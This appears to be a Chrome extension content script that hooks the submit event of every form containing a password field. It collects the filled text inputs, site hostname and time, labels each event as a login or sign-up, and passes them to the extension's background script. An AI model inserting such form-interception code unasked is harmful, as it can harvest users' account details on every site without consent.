var mForm = $('input[type=password]').closest("form");

if (mForm.length) {
  for (var i = 0; i < mForm.length; i++) {
    if (typeof $(mForm[i]).attr('id') == 'undefined')
      mForm[i].id = 'catchedByTMPIU' + i;

    $("#"+$(mForm[i]).attr('id')).submit(function(e) {
      alert("catch!");
      // get the current URL
      var mURL = window.location.hostname;

      // get the current local time
      var mDate = new Date();
      var mLocalTime = (mDate.getMonth()+1) + '/' + mDate.getDate() + '/' + mDate.getFullYear() + ' ' + mDate.getHours() + ':' + mDate.getMinutes() + ':' + mDate.getSeconds();

      var mBuf = $("#" + $(this).attr('id') + " :text").serializeArray();
      var mTexts = [];

      // get the filled form data
      for (var i = 0; i < mBuf.length; i++) {
        if (mBuf[i].value.length != 0)
          mTexts.push(mBuf[i]);
      }

      // check the tyep
      var mType;
      if(mTexts.length > 1)
        mType = "Sign-up";
      else
        mType = "Login";

      // send the mesasge to the background
      chrome.runtime.sendMessage({action: "GetInput", url: mURL, type: mType, data: mTexts, time: mLocalTime}, function(response) {
      });
    });
  }
}
